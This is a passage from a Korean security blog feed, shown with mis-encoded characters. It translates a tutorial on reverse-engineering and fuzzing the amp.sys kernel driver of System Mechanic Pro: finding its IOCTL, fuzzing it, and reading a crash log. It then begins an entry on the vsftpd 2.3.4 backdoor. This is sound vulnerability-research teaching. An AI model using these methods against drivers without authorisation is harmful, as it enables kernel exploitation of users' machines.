ì´ë¯¸ì§€(ì»¤ë„ì´ ë“œë¼ì´ë²„ ì½”ë“œë¥¼ ë¡œë“œí•˜ëŠ” <code>.sys</code> íŒŒì¼)ì˜ ë ˆì§€ìŠ¤íŠ¸ë¦¬ ê²½ë¡œë¥¼ í¬í•¨í•˜ëŠ” <code>UNICODE_STRING</code> êµ¬ì¡°ì²´ (UTF-16 ë¬¸ìì—´ ë° ê¸°íƒ€ ì œì–´ì •ë³´ë¥¼ í¬í•¨í•˜ëŠ” êµ¬ì¡°ì²´)ì— ëŒ€í•œ í¬ì¸í„°ì´ë‹¤.</p><h2 id="Devices-amp-Symlinks"><a href="#Devices-amp-Symlinks" class="headerlink" title="Devices &amp; Symlinks"></a>Devices &amp; Symlinks</h2><p>ìœ ì € ëª¨ë“œì—ì„œ ì•¡ì„¸ìŠ¤ í•˜ë ¤ë©´ ë“œë¼ì´ë²„ê°€ í‘œì¤€ ìœ ì € í”„ë¡œì„¸ìŠ¤ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆë„ë¡ ì¥ì¹˜ì™€ ì‹¬ë³¼ë¦­ ë§í¬(a.k.a symlink)ë¥¼ ë§Œë“¤ì–´ì•¼ í•œë‹¤. ì¥ì¹˜ëŠ” í”„ë¡œì„¸ìŠ¤ê°€ ë“œë¼ì´ë²„ì™€ ìƒí˜¸ì‘ìš© í•  ìˆ˜ ìˆë„ë¡ í•˜ëŠ” ì¸í„°í˜ì´ìŠ¤ì´ë©° ì‹¬ë³¼ë¦­ ë§í¬ëŠ” <code>Win32</code>í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” ë™ì•ˆ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ì¥ì¹˜ ì´ë¦„(alias-ë³„ì¹­)ì´ë‹¤.</p><p>ì‹¬ë³¼ë¦­ ë§í¬ì˜ ì˜ˆ:  <code>C:\</code>ëŠ” ì €ì¥ì¥ì¹˜ë¥¼ ìœ„í•œ ì‹¬ë³¼ë¦­ ë§í¬ì— ë¶ˆê³¼í•˜ë‹¤. <code>Sysinternals</code>ì˜ <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/winobj">WinObj</a> íˆ´ì„ ì‚¬ìš©í•´ root namespace ì•„ë˜ì˜ <code>GLOBAL??</code>  ë””ë ‰í„°ë¦¬ì—ì„œ <code>C:</code>ë¥¼ ì°¾ì„ ìˆ˜ ìˆë‹¤.  </p><p><img src="/2021/04/21/l0ch/exploiting-driver/Untitled%201.png" alt="exploiting-driver/Untitled%201.png"></p><p>ë“œë¼ì´ë²„ëŠ” <code>IoCreateDevice</code> ë° <code>IoCreateSymbolicLink</code>ë¥¼ ì‚¬ìš©í•˜ì—¬ ì¥ì¹˜ ë° ì‹¬ë³¼ë¦­ ë§í¬ë¥¼ ë§Œë“ ë‹¤. ë“œë¼ì´ë²„ë¥¼ ë¦¬ë²„ìŠ¤ ì—”ì§€ë‹ˆì–´ë§ í•  ë•Œ ìœ„ ë‘ í•¨ìˆ˜ê°€ ì—°ì†ì ìœ¼ë¡œ í˜¸ì¶œì´ ì¥ì¹˜ì™€ ì‹¬ë³¼ë¦­ ë§í¬ë¥¼ ì¸ìŠ¤í„´ìŠ¤í™” í•˜ëŠ” ë¶€ë¶„ì¸ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. ëŒ€ë¶€ë¶„ì˜ ë“œë¼ì´ë²„ëŠ” í•˜ë‚˜ì˜ ì¥ì¹˜ë§Œ ì‚¬ìš©í•˜ë¯€ë¡œ ëŒ€ë¶€ë¶„ í•œ ë²ˆë§Œ ë°œìƒí•˜ë©° ì¼ë°˜ì ìœ¼ë¡œ ì¥ì¹˜ ì´ë¦„ì€ <code>\Device\VulnerableDevice</code> í˜•ì‹ì„ ì‚¬ìš©í•œë‹¤. ë°˜ë©´ ì‹¬ë³¼ë¦­ ë§í¬ëŠ” <code>\\.\VulnerableDeviceSymlink</code> í˜•ì‹ê³¼ ìœ ì‚¬í•˜ë‹¤. ì´ì œ ë“œë¼ì´ë²„ì˜ â€œfrontendâ€ì— ëŒ€í•´ ì„¤ëª…í–ˆìœ¼ë¯€ë¡œ â€œbackendâ€ì¸ ë””ìŠ¤íŒ¨ì¹˜ ë£¨í‹´ì— ëŒ€í•´ ì„¤ëª…í•˜ê² ë‹¤.</p><h2 id="Dispatch-Routines"><a href="#Dispatch-Routines" class="headerlink" title="Dispatch Routines"></a>Dispatch Routines</h2><p>ë“œë¼ì´ë²„ëŠ” ì¥ì¹˜ì—ì„œ í˜¸ì¶œë˜ëŠ” í•¨ìˆ˜ì— ë”°ë¼ ë‹¤ë¥¸ ì‘ì—…(a.k.a í•¨ìˆ˜/ë£¨í‹´)ì„ ì‹¤í–‰í•œë‹¤. ë“œë¼ì´ë²„ëŠ” <code>WriteFile</code>, <code>ReadFile</code> ë˜ëŠ” <code>DeviceIoControl</code> APIê°€ í•´ë‹¹ ì¥ì¹˜ì—ì„œ í˜¸ì¶œë  ë•Œ ê°ê° ë‹¤ë¥´ê²Œ ì‘ë™í•  ìˆ˜ ìˆë‹¤. ì´ ë™ì‘ì€ <code>DriverObject</code>êµ¬ì¡°ì²´ì˜ í•¨ìˆ˜ í¬ì¸í„° ë°°ì—´ì¸ <code>MajorFunctions</code>ë©¤ë²„ë¥¼ í†µí•´ ë“œë¼ì´ë²„ ê°œë°œìê°€ ì œì–´í•œë‹¤. <code>WriteFile</code>, <code>ReadFile</code> ë˜ëŠ” <code>DeviceIoControl</code>ê³¼ ê°™ì€ APIëŠ” <code>MajorFunctions</code> ë‚´ì— í•´ë‹¹ ì¸ë±ìŠ¤ê°€ ìˆì–´ ê´€ë ¨ í•¨ìˆ˜ í¬ì¸í„°ê°€ í˜¸ì¶œëœë‹¤. ì¼ë¶€ ë§¤í¬ë¡œë¥¼ ì‚¬ìš©í•˜ì—¬ ê´€ë ¨ ì¸ë±ìŠ¤ë¥¼ ê¸°ì–µí•  ìˆ˜ ìˆìœ¼ë©° ë‹¤ìŒì€ ëª‡ ê°€ì§€ ì˜ˆë‹¤.</p><ul><li><code>IRP_MJ_CREATE</code> : <code>CreateFile</code> í˜¸ì¶œ í›„ í˜¸ì¶œë˜ëŠ” í•¨ìˆ˜ í¬ì¸í„°ë¥¼ í¬í•¨í•˜ëŠ” ì¸ë±ìŠ¤</li><li><code>IRP_MJ_READ</code> : <code>ReadFile</code>ê³¼ ê°™ì€ í•¨ìˆ˜ì™€ ê´€ë ¨ëœ ì¸ë±ìŠ¤</li><li><code>IRP_MJ_DEVICE_CONTROL</code> : DeviceIoControlì— í•´ë‹¹í•˜ëŠ” ì¸ë±ìŠ¤</li></ul><p>ë“œë¼ì´ë²„ ê°œë°œìê°€ <code>MyDriverRead</code> ë¼ëŠ” í•¨ìˆ˜ë¥¼ ì •ì˜í–ˆìœ¼ë©° í”„ë¡œì„¸ìŠ¤ê°€ ë“œë¼ì´ë²„ ì¥ì¹˜ì—ì„œ <code>ReadFile</code> APIë¥¼ í˜¸ì¶œí•  ë•Œ í˜¸ì¶œë˜ê¸°ë¥¼ ì›í•œë‹¤ê³  ê°€ì •í•´ë³¸ë‹¤. <code>DriverEntry</code> ë‚´ë¶€ (ë˜ëŠ” í˜¸ì¶œëœ í•¨ìˆ˜)ì— ë‹¤ìŒ ì½”ë“œë¥¼ ì‘ì„±í•˜ë©´ ëœë‹¤.</p><pre><code class="hljs cpp">DriverObject-&gt;MajorFunctions[IRP_MJ_READ] = MyDriverRead;</code></pre><p>ì´ì™€ ê°™ì€ í•¨ìˆ˜ëŠ” ë””ìŠ¤íŒ¨ì¹˜ ë£¨í‹´ì˜ ì´ë¦„ì„ ì‚¬ìš©í•œë‹¤. ê·¸ëŸ¬ë‚˜ <code>MajorFunctions</code>ëŠ” ì œí•œëœ í¬ê¸°ì˜ ë°°ì—´ì´ë¯€ë¡œ ë“œë¼ì´ë²„ì— ë§ì€ ë””ìŠ¤íŒ¨ì¹˜ ë£¨í‹´ì„ í• ë‹¹í•˜ì§€ ëª»í•œë‹¤. ì´ ë¬¸ì œì ì€ ìœ ì € ëª¨ë“œ í•¨ìˆ˜ <code>DeviceIoControl</code> ë¥¼ ì‚¬ìš©í•˜ëŠ” ì´ìœ ê°€ ëœë‹¤.</p><h2 id="DEVICEIOCONTROL-amp-IOCTL-Codes"><a href="#DEVICEIOCONTROL-amp-IOCTL-Codes" class="headerlink" title="DEVICEIOCONTROL &amp; IOCTL Codes"></a>DEVICEIOCONTROL &amp; IOCTL Codes</h2><p><code>IRP_MJ_DEVICE_CONTROL</code>ë¡œ ì •ì˜ëœ <code>MajorFunctions</code> ë‚´ì—ëŠ” íŠ¹ì • ì¸ë±ìŠ¤ê°€ ìˆë‹¤. ì´ ì¸ë±ìŠ¤ì—ëŠ” ë“œë¼ì´ë²„ ì¥ì¹˜ì—ì„œ <code>DeviceIoControl</code> API í˜¸ì¶œ í›„ í˜¸ì¶œë˜ëŠ” ë””ìŠ¤íŒ¨ì¹˜ ë£¨í‹´ì˜ í•¨ìˆ˜ í¬ì¸í„°ê°€ ì €ì¥ëœë‹¤. ì´ í•¨ìˆ˜ëŠ” ì¸ìˆ˜ ì¤‘ í•˜ë‚˜ê°€ IOCTLë¡œ ì•Œë ¤ì§„ 32 ë¹„íŠ¸ ì •ìˆ˜ì´ê¸° ë•Œë¬¸ì— ë§¤ìš° ì¤‘ìš”í•˜ë‹¤. ì´ I/O ì½”ë“œëŠ” ë“œë¼ì´ë²„ì— ì „ë‹¬ë˜ê³  <code>DeviceIoControl</code>ì„ í†µí•´ ì „ë‹¬ë˜ëŠ” IOCTLì— ë”°ë¼ ê°ê°ì˜ ì‘ì—…ì„ ìˆ˜í–‰í•œë‹¤. ì¸ë±ìŠ¤ <code>IRP_MJ_DEVICE_CONTROL</code>ì˜ ë””ìŠ¤íŒ¨ì¹˜ ë£¨í‹´ì€ ì½”ë“œì˜ ë‹¤ìŒê³¼ ê°™ì€ ìŠ¤ìœ„ì¹˜ ì¼€ì´ìŠ¤ì²˜ëŸ¼ ì‘ë™í•œë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-keyword">switch</span>(IOCTL)&#123;    <span class="hljs-keyword">case</span> <span class="hljs-number">0xDEADBEEF</span>:        DoThis();        <span class="hljs-keyword">break</span>;    <span class="hljs-keyword">case</span> <span class="hljs-number">0xC0FFEE</span>;        DoThat();        <span class="hljs-keyword">break</span>;    <span class="hljs-keyword">case</span> <span class="hljs-number">0x600DBABE</span>;    DoElse();    <span class="hljs-keyword">break</span>;&#125;</code></pre><p>ì´ëŸ¬í•œ ë°©ì‹ìœ¼ë¡œ ê°œë°œìëŠ” í”„ë¡œì„¸ìŠ¤ì—ì„œ ì „ì†¡í•˜ëŠ” IOCTL ì½”ë“œì— ë”°ë¼ ë“œë¼ì´ë²„ê°€ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ë„ë¡ í•  ìˆ˜ ìˆë‹¤. ì´ëŸ¬í•œ ì¢…ë¥˜ì˜ â€œì½”ë“œ ì§€ë¬¸â€ì€ ë“œë¼ì´ë²„ë¥¼ ë¦¬ë²„ìŠ¤ ì—”ì§€ë‹ˆì–´ë§ í•˜ëŠ” ë™ì•ˆ ì°¾ê¸°ê°€ ë§¤ìš° ì‰½ê¸° ë•Œë¬¸ì— ë§¤ìš° ì¤‘ìš”í•˜ë‹¤. ì–´ë–¤ IOCTLì´ ì–´ë–¤ ì½”ë“œë¡œ ì—°ê²°ë˜ëŠ”ì§€ ì•Œë©´ ë“œë¼ì´ë²„ë¥¼ ë” ì‰½ê²Œ ë¶„ì„í•˜ê³  í¼ì§•í•  ìˆ˜ ìˆë‹¤.</p><h1 id="Reverse-Engineering-Finding-the-IOCTL"><a href="#Reverse-Engineering-Finding-the-IOCTL" class="headerlink" title="Reverse Engineering: Finding the IOCTL"></a>Reverse Engineering: Finding the IOCTL</h1><p>ë“œë¼ì´ë²„ ë¦¬ë²„ìŠ¤ ì—”ì§€ë‹ˆì–´ë§ì„ ì‹œì‘í•˜ê¸° ì „ì— ì²« ë²ˆì§¸ë¡œ í•´ì•¼ í•  ì¼ì€ í†µì‹ ì— ì‚¬ìš©í•˜ëŠ” IOCTL ì½”ë“œì™€ ì¥ì¹˜ ì´ë¦„ (symlink)ì„ ì°¾ëŠ” ê²ƒì´ë‹¤. ìš°ë¦¬ì˜ ê²½ìš° ëŒ€ìƒ ì• í”Œë¦¬ì¼€ì´ì…˜ì€ <code>iolo â€“ System Mechanic Pro v.15.5.0.61 (amp.sys)</code>ì´ë©° ì„¤ì¹˜ ì‹œ <code>WinObj</code>ë¥¼ í™œìš©í•˜ì—¬ ë‹¤ìŒê³¼ ê°™ì´ ì¥ì¹˜ ì´ë¦„ê³¼ ê¶Œí•œì„ ë³µêµ¬í–ˆë‹¤.</p><p><img src="/2021/04/21/l0ch/exploiting-driver/Untitled%202.png" alt="exploiting-driver/Untitled%202.png"></p><p>ì´ì œ ì¥ì¹˜ ì´ë¦„ <code>\Device\AMP</code>ì„ ìˆ˜ì§‘í–ˆìœ¼ë‹ˆ ë“œë¼ì´ë²„ <code>amp.sys</code>ë¥¼ ë””ìŠ¤ì–´ì…ˆë¸”ëŸ¬ (IDA ì‚¬ìš©)ì— ë¡œë“œí•˜ê³  ëˆ„ë½ëœ ê²½ìš° ë‹¤ìŒê³¼ ê°™ì€ í•„ìš”í•œ êµ¬ì¡°ì²´ë¥¼ ì¶”ê°€í•œë‹¤.</p><ul><li><code>DRIVER_OBJECT</code></li><li><code>IRP</code></li><li><code>IO_STACK_LOCATION</code></li></ul><p><code>DriverEntry</code> í•¨ìˆ˜ì— ë„ë‹¬í•˜ë©´ ë“œë¼ì´ë²„ê°€ ìƒê°ë³´ë‹¤ ì¡°ê¸ˆ ë” ë³µì¡í•˜ë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤. <code>Imports</code> ì„¹ì…˜ì—ì„œ <code>IoDeviceControl</code> APIë¥¼ xrefí•˜ê¸°ë¡œ ê²°ì •í–ˆìœ¼ë©° ê·¸ ê²°ê³¼ëŠ” <code>SUB_2CFE0</code>(<code>DriverCreateDevice</code>ë¡œ ë³€ê²½) í•˜ë‚˜ë¿ì´ë‹¤. </p><p><img src="/2021/04/21/l0ch/exploiting-driver/Untitled%203.png" alt="exploiting-driver/Untitled%203.png"></p><p><code>DeviceName</code>ì´ ì¸ìŠ¤í„´ìŠ¤í™” ë˜ê³  <code>DriverObject</code>ê°€ ì „ë‹¬ë˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìœ¼ë¯€ë¡œ ì˜¬ë°”ë¥¸ í•¨ìˆ˜ì— ë„ë‹¬í–ˆìŒì„ ì•Œ ìˆ˜ ìˆê³  ë””ì»´íŒŒì¼ì„ ì§„í–‰í–ˆë‹¤.</p><p><img src="/2021/04/21/l0ch/exploiting-driver/Untitled%204.png" alt="exploiting-driver/Untitled%204.png"></p><p><code>MajorFunction[14] (offset 0x0e)</code>ì„ ì‚´í´ë³´ë©´ <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/irp-mj-device-control">IRP_MJ_DEVICE_CONTROL</a> ë“œë¼ì´ë²„ë¥¼ ì°¾ì„ ìˆ˜ ìˆë‹¤. ì´ëŠ” ì‹œìŠ¤í…œ ì •ì˜ IOCTL ì„¸íŠ¸ê°€ ìˆëŠ” ê²½ìš° <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nc-wdm-driver_dispatch">DispatchDeviceControl</a> ë£¨í‹´ì—ì„œ ë“œë¼ì´ë²„ê°€ ì§€ì›í•´ì•¼ í•˜ëŠ” ìš”ì²­ì´ë‹¤. <code>SUB_2C580</code>ì„ ë””ì»´íŒŒì¼í•˜ë©´ ì´ ë“œë¼ì´ë²„ì— ëŒ€í•œ IOCTL ì½”ë“œì— ë„ë‹¬í•  ìˆ˜ ìˆë‹¤. ì•„ë˜ì˜ ë””ì»´íŒŒì¼ ì½”ë“œë¥¼ ë³´ê³  ì§ì ‘ IOCTL ì½”ë“œë¥¼ ì°¾ì•„ë³´ì.</p><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">sub_2C580</span><span class="hljs-params">(__int64 a1, IRP *a2)</span></span><span class="hljs-function"></span>&#123;  BOOLEAN v3; <span class="hljs-comment">// [rsp+20h] [rbp-38h]</span>  ULONG v4; <span class="hljs-comment">// [rsp+24h] [rbp-34h]</span>  _IO_STACK_LOCATION *v5; <span class="hljs-comment">// [rsp+28h] [rbp-30h]</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// [rsp+30h] [rbp-28h]</span>  PNAMED_PIPE_CREATE_PARAMETERS v7; <span class="hljs-comment">// [rsp+38h] [rbp-20h]</span>  a2-&gt;IoStatus.Information = <span class="hljs-number">0</span>i64;  v5 = a2-&gt;Tail.Overlay.CurrentStackLocation;  <span class="hljs-keyword">if</span> ( v5-&gt;Parameters.Read.ByteOffset.LowPart == <span class="hljs-number">2252803</span> )  &#123;    v4 = v5-&gt;Parameters.Create.Options;    v7 = v5-&gt;Parameters.CreatePipe.Parameters;    v3 = IoIs32bitProcess(a2);    v6 = sub_166D0(v3, v7, v4);  &#125;  <span class="hljs-keyword">else</span>  &#123;    v6 = <span class="hljs-number">-1073741808</span>;  &#125;  a2-&gt;IoStatus.Status = v6;  IofCompleteRequest(a2, <span class="hljs-number">0</span>);  <span class="hljs-keyword">return</span> v6;&#125;</code></pre><p>ì°¾ì„ ìˆ˜ ì—†ê±°ë‚˜ ë¶„ì„ì´ ì¶”ê°€ëœ ì½”ë“œë¥¼ ì›í•œë‹¤ë©´ ë‹¤ìŒ ì½”ë“œë¥¼ ì‚´í´ë³´ì.</p><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">Driver_IRP_MJ_DEVICE_CONTROL</span><span class="hljs-params">(DEVICE_OBJECT *DeviceObject, IRP *Irp)</span></span><span class="hljs-function"></span>&#123;  __int64 result; <span class="hljs-comment">// rax</span>  _BYTE Is32BitProcess; <span class="hljs-comment">// [rsp+20h] [rbp-38h]</span>  _DWORD bufferSize; <span class="hljs-comment">// [rsp+24h] [rbp-34h]</span>  _QWORD IoStackLocation; <span class="hljs-comment">// [rsp+28h] [rbp-30h]</span>  NTSTATUS status; <span class="hljs-comment">// [rsp+30h] [rbp-28h]</span>  _QWORD userBuffer; <span class="hljs-comment">// [rsp+38h] [rbp-20h]</span>  _QWORD; <span class="hljs-comment">// [rsp+68h] [rbp+10h]</span>  Irp-&gt;IoStatus.Information = <span class="hljs-number">0</span>i64;  IoStackLocation = Irp-&gt;Tail.Overlay.CurrentStackLocation;  <span class="hljs-keyword">if</span> ( IoStackLocation-&gt;Parameters.Read.ByteOffset.LowPart == <span class="hljs-number">0x226003</span> )<span class="hljs-comment">// IOCTL Code</span>  &#123;    bufferSize = IoStackLocation-&gt;Parameters.Create.Options;    userBuffer = &amp;IoStackLocation-&gt;Parameters.CreatePipe.Parameters-&gt;NamedPipeType;    Is32BitProcess = IoIs32bitProcess(Irp);    status = DriverVulnerableFunction(Is32BitProcess, userBuffer, bufferSize);  &#125;  <span class="hljs-keyword">else</span>  &#123;    status = <span class="hljs-number">0xC0000010</span>;                        <span class="hljs-comment">// STATUS_INVALID_DEVICE_REQUEST</span>  &#125;  Irp-&gt;IoStatus.Status = status;  IofCompleteRequest(Irp, <span class="hljs-number">0</span>);  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)status;&#125;</code></pre><p>IOCTL ì½”ë“œ <code>0x226003</code>ëŠ” IOCTL ìš”ì²­ê³¼ í•¨ê»˜ ì „ë‹¬ëœ ë°ì´í„° ë²„í¼ì— ì•¡ì„¸ìŠ¤í•  ë•Œ ì»¤ë„ì´ ì‚¬ìš©í•˜ëŠ” ë°©ë²•ì„ ì´í•´í•˜ê¸° ìœ„í•´ ì¶”ê°€ë¡œ ë””ì½”ë”©ë  ìˆ˜ ìˆë‹¤. <a href="https://www.osronline.com/article.cfm%5Earticle=229.htm">OSR ì˜¨ë¼ì¸ IOCTL ë””ì½”ë”</a> íˆ´ì„ ì‚¬ìš©í•˜ì—¬ ë‹¤ìŒ ì •ë³´ë¥¼ ë³µêµ¬í•  ìˆ˜ ìˆë‹¤.</p><p><img src="/2021/04/21/l0ch/exploiting-driver/Untitled%205.png" alt="exploiting-driver/Untitled%205.png"></p><p><code>METHOD_NEITHER</code>ëŠ” IOCTL ìš”ì²­ê³¼ í•¨ê»˜ ì „ë‹¬ëœ ë°ì´í„° ë²„í¼ì— ì•¡ì„¸ìŠ¤í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” ê°€ì¥ ì·¨ì•½í•œ ë°©ì‹ì´ë‹¤. ì´ë¥¼ ì‚¬ìš©í•  ë•Œ I/O ê´€ë¦¬ìëŠ” ìœ ì € ë°ì´í„°ì— ëŒ€í•´ ì–´ë–¤ ì¢…ë¥˜ì˜ ìœ íš¨ì„± ê²€ì‚¬ë„ ìˆ˜í–‰í•˜ì§€ ì•Šê³  ì›ì‹œ ë°ì´í„°ë¥¼ ë“œë¼ì´ë²„ì— ê·¸ëŒ€ë¡œ ì „ë‹¬í•œë‹¤. ìœ íš¨ì„± ê²€ì‚¬ ì—†ì´ ìœ ì € ë°ì´í„°ë¥¼ ê´€ë¦¬í•˜ëŠ” ì½”ë“œì— ìˆëŠ” ë²„ê·¸ ë˜ëŠ” ì·¨ì•½ì ì„ ë°œê²¬í•  í™•ë¥ ì´ ë” ë†’ë‹¤. ì´ì œ IOCTL ì½”ë“œ <code>0x226003</code>ì™€ ì¥ì¹˜ ì´ë¦„ <code>\Device\AMP</code>ì„ êµ¬í–ˆìœ¼ë‹ˆ ë“œë¼ì´ë²„ë¥¼ í¼ì§•í•˜ê³  ì·¨ì•½ì ì„ ì°¾ì„ ìˆ˜ ìˆë‹¤.</p><h1 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h1><p>IOCTL ì½”ë“œë¥¼ ê²€ìƒ‰í•œ í›„ <a href="https://github.com/koutto/ioctlbf">ioctlbf</a>ë¡œ ë“œë¼ì´ë²„ë¥¼ í¼ì§•í–ˆë‹¤. Ioctlbf êµ¬ë¬¸ì€ ì´í•´í•˜ê¸° ë§¤ìš° ì‰½ë‹¤. ë¨¼ì € ì¥ì¹˜ ì´ë¦„ <code>-d</code> ë¥¼ ì§€ì •í•œ ë‹¤ìŒ í¼ì§•í•  IOCTL ì½”ë“œë¥¼ <code>-i</code>ë¡œ ì§€ì •í•œ ë’¤ <code>-u</code> ë§¤ê°œ ë³€ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ ì œê³µëœ IOCTL ì½”ë“œë§Œ í¼ì§•í•˜ë„ë¡ í•œë‹¤. (ë“œë¼ì´ë²„ì— IOCTL ì½”ë“œê°€ í•˜ë‚˜ë§Œ ìˆë‹¤ëŠ” ê²ƒì„ ì´ë¯¸ ì•Œê³  ìˆìœ¼ë¯€ë¡œ ë¬´ì°¨ë³„ ëŒ€ì…ì´ í•„ìš” ì—†ë‹¤.)</p><p><img src="/2021/04/21/l0ch/exploiting-driver/Untitled%206.png" alt="exploiting-driver/Untitled%206.png"></p><p>ioctlbfë¥¼ ì‹¤í–‰í•œ ì§í›„ ë‹¤ìŒ ë©”ì‹œì§€ <code>amp+6c8d</code>ì™€ í•¨ê»˜ ë””ë²„ê¸° ë¨¸ì‹ ì—ì„œ í¬ë˜ì‹œê°€ ë°œìƒí–ˆë‹¤.</p><pre><code class="hljs apache"><span class="hljs-attribute">Access</span> violation - code c<span class="hljs-number">0000005</span> (!!! second chance !!!)<span class="hljs-attribute">fffff801</span>`<span class="hljs-number">3</span>ae<span class="hljs-number">96</span>c<span class="hljs-number">8</span>d <span class="hljs-number">488</span>b<span class="hljs-number">0</span>e          mov     rcx,qword ptr<span class="hljs-meta"> [rsi]</span><span class="hljs-attribute">PROCESS_NAME</span>:  ioctlbf.EXE<span class="hljs-attribute">READ_ADDRESS</span>:  <span class="hljs-number">0000000000000000</span> <span class="hljs-attribute">ERROR_CODE</span>: (NTSTATUS) <span class="hljs-number">0</span>xc<span class="hljs-number">0000005</span> - The instruction at <span class="hljs-number">0</span>x%p referenced memory at <span class="hljs-number">0</span>x%p. The memory could not be %s.<span class="hljs-attribute">EXCEPTION_CODE_STR</span>:  c<span class="hljs-number">0000005</span><span class="hljs-attribute">EXCEPTION_PARAMETER1</span>:  <span class="hljs-number">0000000000000000</span><span class="hljs-attribute">EXCEPTION_PARAMETER2</span>:  <span class="hljs-number">0000000000000000</span><span class="hljs-attribute">STACK_TEXT</span>:  <span class="hljs-attribute">ffff9304</span>`c<span class="hljs-number">35</span>c<span class="hljs-number">66</span>e<span class="hljs-number">0</span> ffffe<span class="hljs-number">60</span>b`ecd<span class="hljs-number">87</span>bb<span class="hljs-number">0</span>     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000001</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> fffff<span class="hljs-number">801</span>`<span class="hljs-number">35</span>c<span class="hljs-number">23</span>f<span class="hljs-number">8</span>b ffff<span class="hljs-number">9304</span>`c<span class="hljs-number">35</span>c<span class="hljs-number">6700</span> : amp+<span class="hljs-number">0</span>x<span class="hljs-number">6</span>c<span class="hljs-number">8</span>d<span class="hljs-attribute">ffff9304</span>`c<span class="hljs-number">35</span>c<span class="hljs-number">66</span>e<span class="hljs-number">8</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000001</span>     : <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> fffff<span class="hljs-number">801</span>`<span class="hljs-number">35</span>c<span class="hljs-number">23</span>f<span class="hljs-number">8</span>b ffff<span class="hljs-number">9304</span>`c<span class="hljs-number">35</span>c<span class="hljs-number">6700</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000001</span> : <span class="hljs-number">0</span>xffffe<span class="hljs-number">60</span>b`ecd<span class="hljs-number">87</span>bb<span class="hljs-number">0</span><span class="hljs-attribute">ffff9304</span>`c<span class="hljs-number">35</span>c<span class="hljs-number">66</span>f<span class="hljs-number">0</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>     : fffff<span class="hljs-number">801</span>`<span class="hljs-number">35</span>c<span class="hljs-number">23</span>f<span class="hljs-number">8</span>b ffff<span class="hljs-number">9304</span>`c<span class="hljs-number">35</span>c<span class="hljs-number">6700</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000001</span> ffffe<span class="hljs-number">60</span>b`e<span class="hljs-number">5303</span>c<span class="hljs-number">80</span> : <span class="hljs-number">0</span>x<span class="hljs-number">1</span></code></pre><p>ë„ í¬ì¸í„° ì—­ ì°¸ì¡°ì™€ ìœ ì‚¬í•œ ì˜¤ë¥˜ì´ë‹¤. ì´ì œ ë“œë¼ì´ë²„ë¥¼ ë¦¬ë²„ìŠ¤ ì—”ì§€ë‹ˆì–´ë§í•´ access violationì´ ë°œìƒí•œ ì´ìœ ì™€ ì´ë¥¼ ì•…ìš©í•  ìˆ˜ ìˆëŠ” ë°©ë²•ì´ ìˆëŠ”ì§€ ì´í•´í•˜ê¸°ë¡œ í–ˆë‹¤.</p><hr><p>ë‹¤ìŒ íŒŒíŠ¸ëŠ” ì·¨ì•½ì ì˜ root cause ë¶„ì„ê³¼ ìµìŠ¤í”Œë¡œì‡ì— ëŒ€í•œ ë²ˆì—­ìœ¼ë¡œ ëŒì•„ì˜¤ê² ìŠµë‹ˆë‹¤!</p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>kernel</tag>
      
      <tag>ioctl</tag>
      
      <tag>L0ch</tag>
      
      <tag>driver</tag>
      
      <tag>exploit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2011-2523: í˜„ì¬ì§„í–‰í˜•ì¸ 10ë…„ ì „ vsftpd ë°±ë„ì–´ ì·¨ì•½ì </title>
    <link href="/2021/04/20/l0ch/2021-04-20/"/>
    <url>/2021/04/20/l0ch/2021-04-20/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://nitter.42l.fr/80vul/status/1382548572604813314">Just search for â€œvsftpd version numberâ€ directly in ZoomEye</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>vsftpd 2.3.4</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2011-2523ì€ 10ë…„ ì „ vsftpd 2.3.4ì—ì„œ ë°œê²¬ëœ ì·¨ì•½ì ì…ë‹ˆë‹¤.</p><p>ì†ŒìŠ¤ì½”ë“œì— í¬í•¨ëœ ì›ì¸ë¶ˆëª…ì˜ ë°±ë„ì–´ëŠ” í¬íŠ¸ 6200ì—ì„œ listening shellì„ ì—´ê³ , í•´ì»¤ëŠ” ê³µê°œëœ ê°„ë‹¨í•œ <a href="https://www.exploit-db.com/exploits/49757?utm_source=dlvr.it&utm_medium=twitter">exploit</a>ì„ í†µí•´ ì´ë¥¼ ë§¤ìš° ì‰½ê²Œ ì•…ìš©í•  ìˆ˜ ìˆì–´ ë†’ì€ ì‹¬ê°ë„ë¡œ ë¶„ë¥˜ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>í•´ë‹¹ ì·¨ì•½ì ì€ 2011ë…„ 7ì›” 